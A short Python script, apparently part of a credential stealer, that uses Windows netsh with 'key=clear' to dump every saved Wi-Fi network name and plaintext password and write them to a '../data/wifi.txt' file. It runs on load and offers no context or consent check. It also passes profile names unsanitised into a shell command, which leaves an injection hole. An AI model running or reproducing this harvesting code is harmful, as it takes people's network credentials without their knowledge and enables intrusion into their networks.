import os, re

def wifipass():
   def get_wlans():
      data = os.popen("netsh wlan show profiles").read()
      wifi = re.compile("All User Profile\s*:.(.*)")
      return wifi.findall(data)

   def get_pass(network):
      try:
         wlan = os.popen("netsh wlan show profile "+str(network.replace(" ","*"))+" key=clear").read()
         pass_regex = re.compile("Key Content\s*:.(.*)")
         return pass_regex.search(wlan).group(1)
      except:
         return " "

   f = open("../data/wifi.txt","w")
   for wlan in get_wlans():
       f.write("-----------\n"+" SSID : "+wlan + "\n Password : " + get_pass(wlan))
   f.close()

wifipass()